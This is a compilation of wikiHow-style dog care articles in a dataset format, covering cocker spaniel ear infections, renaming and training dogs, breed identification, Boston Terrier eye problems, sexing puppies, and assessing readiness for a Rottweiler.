, In general, treating ear infections involves cleaning the ears and treating them with topical (i.e., ear drops) or oral medications. Your vet will do the first ear cleaning and treatment, and then give you instructions to treat your cocker spaniel’s ears at home.Depending on the severity of the infection, your vet may need to anesthetize your cocker spaniel to clean and treat his ears.


Your vet may advise you to use only the prescribed medication at home, without cleaning the ears, until your follow-up appointment. Dog owners can sometimes be too aggressive with ear cleaning, so you would not want to further damage your cocker spaniel’s ears with improper cleaning., Your vet will prescribe specific medications, such as antibiotics and antifungals, according to what is causing your cocker spaniel’s ear infection. Medications that reduce pain and inflammation, such as steroids, are also useful for treating ear infections.Antibiotics and antifungals can be given by mouth or as ear drops. Oral administration is recommended when the ear infection is chronic or has spread to the middle of the ear.If your cocker spaniel has ear mites, your vet will prescribe a medication to kill the mites. Many flea preventatives are effective at killing mites.Your vet will explain how to give each medication.

, After the initial ear cleaning and treatment, your vet will want to see your cocker spaniel again in about 5 to 7 days.This will allow your vet to reassess your cocker spaniel’s ears. If the ears are looking better, your vet may advise you to continue with the current treatment plan and monitor the ears.


If the ear infection goes away and then comes back, your vet may have to do more extensive diagnostic testing to determine the cause of the chronic ear infection.

, To successfully treat your cocker spaniel’s ear infection, you must administer the medications exactly as prescribed. For example, treat the ears for the full treatment course—do not stop treating the ears when they start looking better! If you stop the medication early, you may not completely kill the microorganism causing the infection, making a reinfection more likely.If you are giving ear drops, use only the prescribed number of drops.
Do not forget or skip any treatment doses. A missed or skipped dose could increase the likelihood of a reinfection., Cleaning your cocker spaniel’s ears is essential to treating—and preventing—ear infections. To clean his ears, you will need a high-quality ear cleaning solution (available at your local pet store), and cotton balls or cotton gauze (available at your local pharmacy). Do not use a cotton swab—it will push debris down further in the ear and possibly damage the ear drum.Lift the flap of one ear and squirt some ear cleaning solution in the ear, according to the label instructions. Gently massage the base of the ear for about 20 to 30 seconds, then wipe the ear dry with some cotton balls or gauze.Repeat with the other ear.
Your cocker spaniel will probably want to shake his head after you put the solution in his ear. Let him do so.Make sure the tip of the bottle does not touch your cocker spaniel’s ears. Whatever is in his ears could contaminate the solution.
Clean the ears 30 minutes before giving the medicated ear drops.Do not clean his ears too frequently (once or twice week may be adequate). Overly frequent ear cleanings can cause ear infections., You may have heard about home remedies for cleaning a dog’s ears, particularly homemade products containing vinegar. Do not use them! Home remedies and vinegar-based ear cleaning products can irritate the skin in your cocker spaniel’s ears, causing swelling and an increase in secretions than can lead to infection."

Say the name in a happy tone.,
Play games with the new name.,

Avoid using the name when punishing the dog.,
Change the name again if necessary.,
Find a simple name.,
Tell others what the dog's new name is.,
Create a dog-tag with their new name.",How to Train Your New Dog to Respond to a New Name," For the first week, you may need to call the dog both names. To do this, say the old name and the new name together. If the dog responds to this compound-name, you can start dropping the old name after about a week.For example, if the dog’s old name is “Wolfgang” and their new name is “Charlie,” you should call them “Wolfgang Charlie.” After a week or two, you can just call them “Charlie.”;
, For the first few days, you should always carry a few treats on you. This will let you test out their name at random moments during the day.Some good treats to carry include:


Small dog biscuits
Cut-up pieces of cheese
Small bits of meat
Pieces of kibble, Once or twice a day, at a random moment, call out the dog’s new name. Try to encourage the dog to look or come towards you. The best time to do it is when the dog is distracted with another task, such as chewing on a bone or sniffing something. This will teach the dog to respond to their name no matter what they are doing.You can pair the new name with other, already known commands. For example, if your dog responds to the command ""come,"" you can say, ""Bella, comeǃ"" Your dog will start to associate their name with responding to a command.

, If a dog understands their name correctly, they should stop what they are doing and come to you. While training the dog to respond to their new name, you should give them a treat whenever they come at the sound of their name. Once they come, say “Yes. Good dog” in a happy tone. Pet the dog, and give them a treat. This will teach them to associate their new name with good feelings, and they will start to respond even when there is not a treat.Do not use the treat to bribe the dog to you. Only show the dog the treat once they have come over and you have praised them.

, It is important that the dog appropriately responds to their new name. While you should use the name often enough that they learn the name, you should not use their name all of the time. The dog may start to ignore the name if it is used too often. Good times to use the dog’s new name include:When you are playing a recall game like fetch
When you want them to come to you
When using obedience commands such ""sit,"" ""down,"" or ""come""
When you are about to go on a walk

, When you say the dog’s new name, use a happy, pleasant tone. Act excited, and the dog will naturally respond. The dog will also begin to associate the name with pleasant emotions., As you play with the dog, use the name when the dog returns to you. For example, if you are playing fetch, call the dog's name as they are running back to you with the ball in their mouth. This will teach them to associate their name with returning to you. Do not call their name while they are running to catch the ball or when the ball is in your hand, as this may confuse them., Most dogs will start responding to their new name within a few days, but if positive reinforcement isn’t working alone, you can try an exercise on the leash. Place the dog on a leash. Wait until they are distracted. Call their name. If the dog looks at you, reward them. If they do not, gently tug the leash while saying the name until they look at you. Say “Yes. Good dog,” and reward them with a treat. Keep doing this until they respond without you tugging at the leash., To encourage your dog to respond to the new name, it should be associated with pleasant feelings. Do not use the name when punishing, yelling, or disciplining your dog. Otherwise, the dog may grow scared or anxious when they hear their name.If your dog is getting into trouble, instead of using their name, come up with different correction sounds instead. These can be hissing noises (like “tsst” or ""nuh-uh"") or a disruptive verbal command (such as “hey” or “no”)., If after several weeks, the dog is still not responding to the new name, you may need to try again with a different name. Dogs are capable of responding to multiple names, and it will not negatively affect the dog if you change the name again. Try to come up with a different, more distinct name, and begin training again.Do not change your dog's name on a whim. Good reasons to change a dog's name include recent adoption into a new family, a lack of response from the dog towards their old name, or an association between the name and an abusive situation.

, The transition to a new name will go more smoothly if you choose a simple, easily recognizable name. Make sure that the name is no more than two syllables long. You may not want to choose a name that sounds like a command (for example, if you name a dog “Mitt,” he might confuse the name with “sit.”)Some popular dog names include:


Bella
Ollie
Max
Ace
Bailey
Jack
Shiloh
Shadow
Nova, To help teach your dog their new name, it is important that everybody calls them by this name instead of their old one. Inform your friends, family members, and vet of the new name, so that they do not call the dog by the wrong name.

, While your dog cannot read, it is important to put a dogtag on their collar with the new name as soon as possible. This will encourage other people to call them by the new name, thus reinforcing what their name is. Furthermore, if the dog becomes lost, others will be able to call the dog and return them to you."

Look at the head.,
Examine the body shape.,
Feel the coat.,
Check the tail.",How to Identify an English Bulldog2," Many of the English Bulldog’s defining characteristics are part of their distinct face. Take a look at the skull shape, the forehead, the nose, the shape of the ears, and the jawline.English Bulldog skulls tend to be large and round, with broad foreheads and a short, straight line running from the top of the head to the nose. Their foreheads aren’t usually round and their faces are generally flat.
English Bulldog ears generally have short, pointed, floppy ears, sometimes called “rose ears.” English Bulldogs do not have long ears, but unlike other short, pointy-eared breeds, their relaxed ears fall to the side of their head rather than standing upright.
English Bulldogs tend to have a pronounced, turned up jaw despite their short muzzle. This can sometimes lead to an underbite, though not always.

, An English Bulldog should have a broad, round body with wide shoulders and a full chest that makes its front legs appear somewhat shorter than the back. Behind the ribs, the belly should be tucked up rather than rounded, and the back should follow a curve with the head and hindquarters higher than the middle of the back.English Bulldogs are generally rounder and closer to the ground than other bulldog breeds. They should look stout and muscular, but are not necessarily inherently lean dogs.

, An English Bulldog has a short, flat, smooth coat with little to no feathering or curling. English bulldogs can have many different colors or markings, but generally predominantly feature white and brown marks across the body.In addition to the coat, the loose skin around the head, neck, and shoulders is a good indicator of an English Bulldog, as other bulldogs do not always possess such rolls.
English Bulldog coats can come in many colors, but are most commonly white with large brown spots or patches across the body.

, Most English Bulldogs do not have long tails. Rather, they have short, low-hung tails that follow the curve of the spine down toward their hindquarters. Bulldog tails may be straight, or have a slight upturn, or “screw,” to the end of them.While English Bulldog tails may have a screw, rarely do they actually curl. A curled tail on an English Bulldog might be an indicator of cross-breeding.

Watch energy levels.,
Look for gentle demeanors.,
Anticipate bravery.,
Have a vet check for medical problems.",How to Identify an English Bulldog3," Like most dogs, English Bulldogs tend to be enthusiastic as puppies, but as they mature they will slow down. Many adult English Bulldogs have bursts of energy a couple times a day, but do not stay consistently energetic throughout the day.Their unique physical features often make extended exercise difficult for English Bulldogs. Watch for snorting and panting as signs of exhaustion.

, English Bulldogs are generally loyal, affectionate, and gentle dogs, often cited as being good with children and other dogs. Watch a bulldog’s daily interactions to see if they are gentle, affectionate, and moderated like those of an English Bulldog.English Bulldogs tend to be more attention-oriented than some other bulldog breeds. They will actively seek attention from people, rather than waiting for a person to come to them.

, While loyal and affectionate, English Bulldogs also retain the bravery for which they were originally bred. They will often seek out the role of watchdog, and will try to protect their family from unfamiliar threats, including new people or new dogs.English Bulldogs can be particularly protective of small children or other small animals. They are sometimes even known to protect children from scolding or angry parents.

, All breeds of bulldogs tend to suffer from the same medical conditions, but the flat face and round body of English Bulldogs make them especially susceptible. Have a vet check a potential bulldog for medical issues such as hypothyroidism and arthritis, typical of English Bulldogs.The most common medical problems seen amongst English Bulldogs are hypothyroidism, heart disease, allergies that lead to itchy skin, and eye problems including cataracts.

Do not punish your English Springer Spaniel.,
Use a rewards based system of training.,
Use calm, short commands.,
Begin training at an early age.,
Expose your English Springer Spaniel to others early.,
Have patience.",How to Train English Springer Spaniels1," When you are training your English Springer Spaniel, do not get annoyed or angry enough to beat, hit, or punish them. This training method is not beneficial to your Springer and they may act up if you try it on them. You will also run the risk of having your Springer be scared of you or hate you, which is not the kind of relationship you want with your dog.


If you do not train your Springer in the right way, they can become pushy and obnoxious instead of affectionate, loving, and loyal.;
, The most used and beneficial training method is rewards based training. This will treat your English Springer Spaniel to associate doing the things you want them to do with pleasant activities and things, such as snuggles or treats. To use this method, give a specific command to your Springer. When your Springer follows it, give them a reward, such as a treat or other reinforcement.


This will show your dog that doing the right thing brings pleasant things.
As you train your Springer, start small with easy commands, such as stay or sit., When your English Springer Spaniel is not doing what they are supposed to do, express your unhappiness calmly with sharp, short commands. Keep it simple with short phrases such as ""No"" or ""Uh oh"". This will get your point across without having to punish them.


As soon as your Springer starts behaving correctly, praise them for it and show them affection.
Remember to keep your calm demeanor and don’t get mad. This is not productive., Since English Springer Spaniels are so energetic and have tons of stamina, you want to train them early. Your Springer is a natural hunter, so they will look to you for guidance and training.You should start training your Springer when they are still a puppy, so they grow up doing the right behaviors and listening to you.


You can start training your English Springer Spaniel at the age of 8 to 10 weeks old. Any earlier is too young for your Springer to learn anything., Your English Springer Spaniel will thrive on socialization, so make sure you start taking them places and introducing them to others early on. This means you should take your Springer to dog parks, bring them to friends' houses, or invite your friends over to your house to meet them. You want your Springer as comfortable as possible around other people and dogs so they can be more fulfilled. You can also take your Springer to socialization class, where a professional will help you and your dog interact with other young dogs as well.
Take your Springer to have all their shots before you take them around other animals.

, Your English Springer Spaniel is smart, but no dog can be trained right away. Your Springer will take time learn different things as you teach commands to them, you just have to be patient. If you keep with the different types of training, your Springer will get there eventually.


Your Springer may not respond to all forms of training. Keep being patient as you switch between training approaches until you find the one that works best.
For example, if a specific form of treat is not working for your Springer, try a different one. If your approach to teaching your Springer how to sit is not working, try a different environment or treat."

Remember that Cockers, like most domesticated dogs, are 'people dogs', and need to have human company most of the time.,
Make sure you can meet these conditions:


You are home most of the time (or can bring your little buddy with you when you leave the home)
You would enjoy your little friend following you wherever you go in, or out of the house.,
Educate yourself on the grooming and basic maintenance of your Cocker.",How to Take Care of Cocker Spaniels," Cockers not only need human company, but they tend to need their primary humans.;
,
You are willing to make sure he/she knows you love them (they do no appreciate being neglected for long periods of time).
You are willing to exercise him for long walks with fair regularity. They can be high energy dogs that need to release steam to be well adjusted.

, There are great articles/videos on the Internet that can help you. A few basic items that might help you are


Don't be overly alarmed by the small bumps on your dog's body. These bumps are just skin cells the need 'popping'.
Cockers tend to get what is commonly refereed to as 'eye-goobers' (the mucus-like discharge from the eyes). This can be totally eliminated by giving him/her a bath and rinsing his/her face and gently wiping the affected area with a clean and moist clothe. If you use a damp tissue to wipe the 'eye-goober' area daily, you will eliminate the problem completely.
If you have your Cocker groomed every 4-6 weeks (and coat trimmed down short for warm climates), you should not have to brush him too often. If you allow his/her coat to grow out, you will need to brush him/her daily to avoid matting hair.

Watch for signs of a corneal ulcer.,
Monitor your dog's behavior.,
Get the eye examined.,
Follow the vet's treatment plan.,
Learn what increases risk of corneal ulcers.",How to Treat Eye Problems in Boston Terriers1," Your dog's eye may water a lot to the point that it looks like he's crying. The eye can look red and you might see a layer of film over your dog's eye. These can all be signs of a corneal ulcer.A corneal ulcer is like a burst blister on the surface of the clear part of the eye (the cornea).;
, If your dog is in pain because of an ulcer, he may hold the eye partially closed or rub his eye with a paw. Your Boston terrier might look like he's squinting or sensitive to light. If your dog has a corneal ulcer, you'll probably be able to tell that he's in pain based on how he's acting.Ulcers are painful and if they become infected or erode deep into the eye they can cause permanent scar tissue which interferes with vision.

, Take your dog to the vet for a diagnosis. The vet will look at your dog's eye to check for inflammation and ulcers on the surface of the cornea. The vet will also take samples to look for bacterial or fungal infection. A blood sample may be needed to rule out a viral infection.


The vet will check to see how deep the ulcer is. Serious ulcers can erode the eye deeply which can put the eye in danger., Usually, the vet will prescribe antibiotic drops to heal the ulcer and prevent infection. Most ulcers clear up within a week. If your dog isn't responding to treatment, he may need a minor procedure. The vet may need to give your dog local anesthetic and rub at the cornea with a dry cotton swab. This removes any damaged cells that are preventing the eye from healing.


Rarely, the vet may need to put the Boston terrier under full anesthetic to lightly puncture the the surface of the eye. This helps healing cells latch onto the ulcer so that it also heals.

, Boston terriers have large corneas which means that more of this delicate surface is exposed. It could easily get knocked or scratched during play. Fashion trimming (cutting the the whiskers above the eye, especially in show dogs) increases the risk of corneal ulcers.


Boston terriers need the extra protection that they get from the whiskers. Whiskers give them an extra sense of location and warning of danger so they don't knock into objects.

Switch up your treats.,
Vary how often you give treats.,
Give short training sessions.,
End your sessions on a good activity.",How to Train English Springer Spaniels2," The types of rewards you give your English Springer Spaniel should vary so they don’t get complacent or tired of one type of treat. The treats you give don’t have to be food related. You can also give your Springer praise, affection, a play session with their favorite toy, or access to their play area.


You will be able to know which rewards your Springer likes the best. Your Springer will be more eager to get those than other rewards.
You can also change treats depending on the day if your Springer likes them all., As your English Springer Spaniel trains, they will get used to having a treat after every command. However, as your Springer gets better, you need to vary how often you give their treats in order to keep them guessing. As opposed to rewarding your Springer every time they do something they are supposed to, skip a few as they get better at commands to keep them on their toes.


This will make your Springer work harder for the treats because they already know they will get them if they do things correctly.
Start by treating every other correct behavior. As your Springer gets better at this, start skipping two, three, and four behaviors in between treats. Don’t do more than this. The few skipped ones will keep your Springer working for the treats but also let them know the treats are still coming., Your English Springer Spaniel puppy will want to be around you and get affection from you, so they will be easy to train. However, at such a young age, your Springer’s attention span will not be very long. This means you need to keep your training sessions on the shirt side. When you first start, the sessions should be no longer than five minutes.


If you see your Springer’s attention wavering, go ahead and cut the session off. You aren’t going to get anywhere if your Springer isn’t paying attention.
As your Springer ages, they will be able to pay attention longer you’re your sessions can run longer., Whenever you close your training sessions, make sure you end it on a good note. Give your English Springer Spaniel an easy command you know they can do at the end. This way, your Springer will perform the command and you can end the session with a treat or affection.


This will keep good feelings in your puppy’s mind as they leave the training session, which will make them more willing to come back to it in the future."

Give your English Springer Spaniel basic commands.,
Try the clicker training method.,
House train your English Springer Spaniel.,
Crate train your English Springer Spaniel.",How to Train English Springer Spaniels3," One of the first ways you should train your English Springer Spaniels is with simple commands. Your Springer needs to learn to obey these so they do not have any overall behavioral issues as they get older. Start with simple commands, such as ""Stay"", ""Come"", or ""Sit"". Use various treats to help you teach these commands.


For example, hold a treat in your hand. Show your Springer that you have a treat. Take the treat hand and lower it to the ground. As your Springer follows your hand, they will start to lie down. When your Springer is lying all the way down, say calmly and firmly “Lay down” and give them the treat. If you are clicker training, press the clicker when your Springer lays down as well.If your Springer is having a hard time, push their body gently into a laying down position, then say “Lay down” and give them the treat. Your Springer will pick up on the action after a while.
You can use a similar method for all basic commands.

, A supplementary training method for your English Springer Spaniel is clicker training. This will help distinguish desired behaviors for your Springer in addition to your other training methods. It also shows your Springer what good behavior they are being rewarded for. Your Springer will start to link the sound of the clicker with the rewards, which will help reinforce the behavior.As you are training your Springer, hit the clicker every time they do something they should in order to reinforce that good behavior.
For example, if you are teaching your Springer to ""come"", hit the clicker whenever they get to you when you call them., House train your English Springer Spaniel as soon as you bring them home. Your Springer should understand this part of their life as soon as possible. When you first bring your Springer home, take them to a designated potty area in the yard. Tell your Springer “potty” or “toilet” when they go to the bathroom there so they will associate it with that activity. When your Springer does go to the bathroom in the right place, reward them like you would any other behavior. This will link rewards with pottying outside like your Springer should, which will train them to do that every time.


At the early age, your Springer should be taken out every 20 to 30 minutes, moving to longer wait times of about once an hour as they get older.
Keep a constant eye on your Springer at all times indoors when they are learning. You will need to either keep your Springer in a crate when you leave the house, follow them around when you are home, or keep them on a leash.
If your Springer accidentally potties in the house, clean up the excrement as soon and as well as you possibly can to remove the smell. This will deter your Springer from using the same spot again., Training your English Springer Spaniel for a crate is not too difficult. Start by buying a crate large enough for a full sized English Springer Spaniel, even if they are still a puppy. This will ensure that your Springer has plenty of room to stand and move around. Plus, your Springer will be able to continually use it as they grow. Add a comfy palette or bed inside the crate as well as a water bowl and a few of your Springer’s favorite toys.


You want to make the crate as inviting as possible so your Springer will be happy staying in here when you leave the house.
Leave the door open and put a toy inside. When your Springer goes inside, close the door behind them. Leave your Springer inside for a little while at first, then slowly increase how long you leave them in there as they get used to it.
Keep doing this until your Springer can spend hours in the crate without whining.
When your Springer does this correctly, give them tons of praise and maybe a treat."

Look for signs of corneal dystrophy.,
Get a medical diagnosis.,
Treat secondary ulcers.,
Consider surgery.",How to Treat Eye Problems in Boston Terriers2," Your Boston Terrier's eye might look milky or white if he has corneal dystrophy. At first, only the corner of your dog's cornea might look white, but it can quickly spread so that the whole cornea looks thick and white. The cornea may also look swollen with fluid.Boston terriers inherit this condition where fluid builds up between the layers of cells in the corneal. Eventually, painful ulcers on the eye develop., Since corneal dystrophy will begin to affect your dog's vision, take him to the vet as soon as you suspect he has the eye problem. The vet will do a thorough examination and will look at your dog's eyes under a slit-lamp (a microscope with a bright light). The vet will look for thickening of the cornea, ulcers, and inflammation in the eye.The vet will also check your dog's eye pressure to rule out other eye conditions.

, Unfortunately, there is no effective treatment for the milkiness of corneal dystrophy. Your vet will try to treat the secondary corneal ulcers caused by the corneal dystrophy since these are painful and can damage eye health.Your dog will probably need antibiotic eye cream to treat the ulcers.

, The vet may suggest placing a contact lens over your dog's eye or doing surgery to graft tissue over the eye. Another surgery is available that lifts the flap of the eyeball and back of the eyeball to treat corneal dystrophy.Surgery can prevent ulcers, but it may cause scarring that can damage your dog's vision.
If your dog doesn't have ulcers and you notice he's in pain, see the vet immediately. Ulcers may be forming.

Check for redness and swelling.,
Take your Boston Terrier to the vet.,
Do surgery to treat cherry eye.",How to Treat Eye Problems in Boston Terriers3," Your Boston terrier has a third eyelid that sits on the inner corner of the eye. Normally, you don't pay it much attention since you don't really see it. But, if a gland on the third eyelid pops forward, you'll see a large round red swelling mass (like a cherry) in the inner corner of your dog's eye.The job of the third eye is to travel across the cornea to protect it. The third eye also has a gland that makes tear fluid do lubricate the eye.

, Realize that cherry eye usually doesn't cause your dog any pain. But, if you think your dog is bothered by it or you're unsure whether or not he actually has cherry eye or a different eye problem, see the vet.Veterinarians are unsure what causes cherry eye, but it's thought that the connective tissue around the gland weakens. This can cause the gland to pop forward.

, Surgery is really the only way to remove cherry eye, although it's purely a cosmetic decision. The veterinary surgeon will tuck the gland in the correct position and stitch it in place. Your dog will be under anesthesia and won't feel any pain. Be aware that the gland may pop out again requiring surgery again.If you're unsure about surgery, the vet may offer to try steroid ointments. If these don't work, you may choose the surgery.

Look for signs of dry eyes.,
Watch your dog's behavior.,
Take your dog to the vet.,
Lubricate your dog's eyes.",How to Treat Eye Problems in Boston Terriers4," If your dog's eyes aren't making enough natural tear fluid, the eyes can become too dry. You might seen a thick, sticky discharge constantly coming from the eyes. Your Boston terrier's eyes can also appear dull, irritated and red.Dry eyes are more common in middle-aged to older dogs. Boston terriers are prone to developing dry eyes.

, Since your dog's eyes are irritated, he can't blink away debris and lubricate the eyes. You'll probably see him blink frequently as he tries to relieve irritation. He might also squint or try to keep his eyes shut.Dry eyes can also be a result of trauma like scratches or infections., If you suspect your dog has dry eyes, you'll need to take him to the vet to rule out infection. The vet will examine your dog's eyes and test for tear production. During this test, the vet will place a special paper into the corner of your dog's eye to see how much tear film your dog makes in one minute. This information is used to make a diagnosis.The vet will also check your dog's eye pressure to rule out glaucoma and will look for corneal ulcers which could be causing the inflammation.

, The vet will recommend an over-the-counter eye treatment or prescription medication. You'll need to apply watery artificial tears every hour. If you're using thicker drops, you'll need to use them 4 to 6 times a day. Newer products that contain hyaluronic acid only need two applications a day. Realize that dry eyes will need to be managed for life since there is no absolute treatment.If the vet prescribes a medication to encourage tear production, you'll most likely need to use it twice a day, dropping to once a day after the eyes improve.

Look for cloudy eyes.,
Monitor your dog's behavior.,
Get a medical diagnosis.,
Get surgery for cataracts.",How to Treat Eye Problems in Boston Terriers5," The lens of your dog's eye might seem cloudy and bluish-gray. The cataract covering the lens can look crackly or like a chip of ice. It may appear suddenly or develop over several years. Eventually, as the cataract covers more of the lens your dog may go blind.The Boston terrier is a breed that is genetically predisposed to developing cataracts early in life or as part of the aging process.

, Blurred vision caused by cataracts can make it difficult for your dog to see and you may notice his behavior become clumsier. He may seem less sure of his surroundings. To compensate for this loss of vision, you might notice your dog develop a high-stepped walk. You may also notice your dog:Bumping into things.
Not recognizing people.
Misjudging distances.

, If you think your Boston terrier has cataracts, make an appointment with the veterinarian as soon as possible. The vet can usually make a diagnosis simply by looking at your dog's eyes and a veterinary surgeon can confirm the diagnosis.If your dog is older, the vet will determine if your dog has cataracts or if his eyes are simply changing as part of the aging process.

, If your dog has a large cataract interfering with his vision, consider getting it removed. Cataracts are usually treated by surgically removing the lens and replacing it with an artificial one. This treatment requires specialist surgery which can be expensive. Surgery can restore vision, but it's important to do the surgery before your dog's vision gets too bad.You could also consider getting the cataract broken down by a laser. This procedure is called phacoemulsion. It's also an expensive specialist procedure.

Wait several weeks.,
Handle the puppy carefully.,
Keep the puppy warm.,
Rest the puppy in its back.,
Examine the puppy for male features.,
Examine the puppy for female features.,
Avoid common mistakes.,
Only watch urination habits after the first few months.,
Watch for marking.,
Note that female dogs will go into heat.,
Consider affection with caution.",How to Tell if a Dog Is a Girl or Boy," It becomes easier to determine the sex of a puppy as it ages. Try to wait at least three to four weeks before checking to increase your chances of making a correct determination.It will be easiest to wait until a full eight weeks have passed since, after eight weeks, the genitals of male puppies should be fully visible.
Additionally, frequently handling newborn puppies under three weeks of age can cause too much of your scent to transfer to the puppy, masking its own scent in the process. If a puppy smells too ""human,"" its mother may reject it.;
, Newborn puppies are fragile, so you'll need to be especially gentle while handling them.


Make sure that the mother dog is comfortable with you handling her puppies, as well. Some mother dogs can become aggressive if someone unfamiliar touches her puppies, so it's usually best if someone who knows the mother dog performs the check.
If the puppy or the mother become distressed when you handle it, you should return the puppy to its mother and try again at another time.

, You should perform the check in a warm area to prevent the puppy from catching a chill. Young puppies can easily become sick if they get cold.


To the same end, you should only handle the puppy for five to ten minutes. Keeping the puppy out for longer than that can cause it to get too cold.
If the puppy begins to shiver, you should immediately return it to its mother's side or to a heated puppy pen.

, Place a clean, soft towel on your work surface. Carefully pick up the puppy and lay it on its back over the towel, thereby exposing the puppy's belly.


The towel should also be warm. If necessary, throw the towel into a dryer for a few minutes before placing the puppy on it. Do not use towels that are cold, hot, or wet, however.
Alternatively, you could perform the check while holding the puppy if you cup your hands behind the puppy's back to support it.

, You should be able to identify the penis and scrotum of male puppies by examining its belly.If the puppy still has its umbilical cord, look approximately 1/3 inch (1 cm) behind the cord for the puppy's penis. Within the first few weeks of a puppy's life, this organ will look like a small raised lump in the middle of the puppy's belly.
Gently lift the puppy's hind legs until you can see its anus. The scrotum should be just below the anus, almost directly between these hind legs. By eight weeks old, a male puppy's testicles should be enclosed in the scrotum.

, If the puppy is female, you should be able to identify her vulva while the puppy has her belly exposed.


Gently lift the puppy's hind legs until you can see the anus. Above the anus and between the puppy's legs, you should be able to see a leaf-shaped structure. This is the female puppy's vulva.
Unlike male puppies, female puppies do not have any genitals on the belly itself.

, When determining the sex of a puppy, there are a few mistakes you might make if you aren't already familiar with the practice.


Both male and female puppies have nipples, so don't assume that a puppy is female based on that alone.
Do not make the mistake of identifying the detached umbilical cord as the puppy's penis. While both will look like small lumps on the puppy's belly, the detached umbilical cord (navel) will be just beneath the rib cage. Moreover, both sexes will have at least one bump since both will have a navel, but male puppies will have a second bump in between the navel and the legs.

, Young puppies urinate in identical manners regardless of which sex they are. Paying attention to the way a puppy urinates only becomes a reliable judge of gender after six months.During the first few weeks, puppies will not be able to control their bowel movements or urination at all.
Even after the puppies are strong enough to stand and control their habits, all puppies will squat while urinating for the first two months. Many male puppies need as many four to six months before developing the urination habits of adult dogs.
After six months, most male dogs will lift their legs while urinating, while female dogs will continue to squat.

, After a few months, male puppies may begin to mark their territory. Female puppies lack this instinct, however.The urge to mark his territory will be especially strong in male puppies who have not been neutered. Neutering a puppy will greatly reduce his urge to mark.
The exact age when male puppies begin to mark will vary from puppy to puppy, but most will start between two and six months. Some male puppies may begin marking before they learn to lift their leg while urinating.
Watching the puppy carefully will determine whether a puppy is merely urinating or whether it is marking its territory. A dog that urinates quickly in many different locations is likely marking, especially if he intentionally urinates after thoroughly smelling each spot. Dogs that only urinate once or twice generally aren't marking, even if they stop to smell many different spots during a walk.

, Female puppies who have not been spayed will go into heat on a semiannual basis. The first heat cycle will occur when the puppy is between six and ten months old.


Female puppies in heat will produce a vaginal discharge. You can put dog ""diapers"" on to reduce the mess it causes, but in many cases, it will be easiest to simply keep the dog confined in a designated area that can be cleaned later.
Each heat cycle will last for approximately three weeks.

, Both male and female dogs can be equally affectionate, so this is more indicative of a puppy's personality than the puppy's gender.


Female puppies do have a greater tendency to show affection through licking than male puppies, however. This results from the female puppy's instinct to groom other pack members. Expect the licks to be strong and precise.
Puppies who only give the occasional lick are likely doing so out of momentary affection, and not as a result of any grooming instinct. As such, you can expect the occasional lick from both male and female puppies.

Pick a Cavalier with the right coloring.,
Choose a Cavalier with a quality coat.,
Choose a healthy looking dog.,
Have a veterinarian examine the Cavalier.",How to Select a Cavalier King Charles Spaniel1," Cavalier King Charles Spaniels have luxurious coats and come in four different color combinations known as Blenheim (chestnut red and white), Black and Tan, Tricolor (chestnut red, white and black) and Ruby (solid chestnut red). Most breeders value Cavaliers with long, slightly wavy fur. They prefer dogs to have clearly definable colors. They don't like dogs with a lot of ""ticking"". This means that if a Cavalier has a predominantly black back, they shouldn't have ""ticks"" or little spots of other colors mixed in. , Purebred Cavalier show dogs are normally celebrated for their straight fur. If the dog you’re thinking of adopting has a slight wave in its fur, this is completely acceptable. Cavaliers require a modicum of grooming. You should brush them regularly — a couple of times a week. A Cavalier Spaniels rarely have their coats trimmed and they generally only require bathing once every couple of weeks.Cavaliers shed a lot. When you go to pick out a Cavalier for yourself, pay close attention to their coat. If you see a lot of loose hair on the dog or in its area, ask the seller how frequently they brush the dog or clean the area. Most of the time, shedding is the result of the dog’s environment or its diet — both of which can be changed by you.

, Purebred Cavaliers generally have a lot of health issues resulting from generations of inbreeding to keep their line pure. The most obvious signs of a healthy Cavalier will be its coat, its eyes, and its ears. These tend to be the biggest problem areas on Cavaliers and therefore should be the first aspects to consider when purchasing a new Cavalier.


Make sure its eyes, nose, and ears are clean and free of discharge. Its coat should be clean and free of parasites such as fleas. A puppy with prominent ribs and a potbelly is likely to have worms. Worms can be treated, but could indicate that his care or that of the mother, was less than ideal., Regardless of what the seller says, have your vet check out your new friend. Make sure they focus on issues specific to Cavaliers (like those mentioned above) and environmental concerns like mites, fleas, ticks, and heart worms.


Health-wise, always have puppies checked out prior to purchase. A heart murmur in a puppy is likely to be bad news in the long run, with a high risk of progression into premature heart failure. If you get an adult dog, then it is wise to have a veterinarian check the dog prior to purchase also. The veterinarian can check for common ailments that affect Cavaliers and other issues."

Be prepared to manage shedding.",How to Know if You Can Care for a Rottweiler," Think about your home before deciding to adopt a Rottweiler. Because of their nature and history as cattle dogs, they need lots of space and a yard to run around.


Rottweilers do not tolerate extreme temperatures.
Since Rottweilers are good guard dogs, you should be cognizant that they will bark or even scratch at doors if cooped up in a confined space at home. This is a concern if you are renting a home.
Rottweilers are relatively large dogs and need a decent size yard to run around in. Keeping a Rottweiler in an apartment or a town home with a small yard may prove problematic.;
, Caring for a Rottweiler will require you to spend money on a variety of things. Depending on your stage of life and your economic situation, this could present you with a hardship. As a result, you need to put together a budget and consider all of the costs involved in Rottweiler ownership.


Consider food costs. As medium/large dogs, feeding a Rottweiler could cost between $10-$20 a week. This cost could be much higher if the dog develops special dietary restrictions.
Think about vet costs. At the bare minimum, a dog will need a variety of immunizations and diagnostic tests every year. Depending on your region, this could be several hundred to several thousand dollars. You should also consider emergencies, and make sure you'll have some money socked away in case your potential dog has an unplanned medical emergency.
Factor in adoption costs. Adopting a dog can run from $50 to several hundred dollars.
Plan for the cost of toys. Make sure you factor in the cost of toys. This could be a couple hundred dollars a year when a dog is young., Rottweilers, like other breeds of dog, require a lot of time and care. Before adopting a Rottweiler, carefully consider your schedule to see if you have the time to devote to a dog.


Consider play time. You should play/walk a Rottweiler at least a little bit every day (30 minutes to an hour).
Consider the time it takes to go to a vet and obtain healthcare for a Rottweiler.
Consider the time it will take you to walk/feed/love the dog before you leave for work every day., Before getting a Rottweiler, you need to talk to your family or roommates to determine if it is okay with them. After all, a new Rottweiler will necessarily become part of the family. You need to make sure that all members of your household accept your decision and will accept a new dog into their lives.


Ask your family what they think. When approaching your family, ask them ""What do you think about adopting a dog?"" or ""How do you feel about getting a Rottweiler?""
Make sure no one has any allergies. Consider having your family tested for allergies to dog hair or dander.
Never make a unilateral decision about adopting a dog if you live with others., Before adopting a Rottweiler, make sure to talk to your insurance agent to see whether your policy will cover you if you have a Rottweiler living in your home. This is important, as many insurance policies do not cover homes with Rottweilers.


Call your agent and ask about whether your policy will cover you if you bring home a Rottweiler.
